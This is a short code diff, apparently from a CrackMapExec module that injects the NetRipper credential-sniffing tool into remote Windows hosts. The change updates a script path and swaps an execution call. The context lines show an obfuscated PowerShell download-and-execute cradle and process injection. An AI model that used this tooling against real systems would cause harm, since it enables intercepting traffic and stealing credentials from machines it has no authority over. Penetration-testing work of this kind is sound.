@@ -32,7 +32,7 @@ class CMEModule:
             exit(1)
 
         self.share_name = gen_random_string(5).upper()
-        self.ps_script1 = obfs_ps_script('Invoke-PSInject.ps1')
+        self.ps_script1 = obfs_ps_script('cme_powershell_scripts/Invoke-PSInject.ps1')
         self.ps_script2 = obfs_ps_script('netripper/PowerShell/Invoke-NetRipper.ps1')
 
         context.log.info('This module will not exit until CTRL-C is pressed')
@@ -47,9 +47,8 @@ class CMEModule:
 
         netripper_cmd = gen_ps_iex_cradle(context, 'Invoke-NetRipper.ps1', command, post_back=False)
         launcher = gen_ps_inject(netripper_cmd, context)
-        ps_command = create_ps_command(launcher)
 
-        connection.execute(ps_command)
+        connection.ps_execute(launcher)
         context.log.success('Executed launcher')
 
     def on_request(self, context, request):
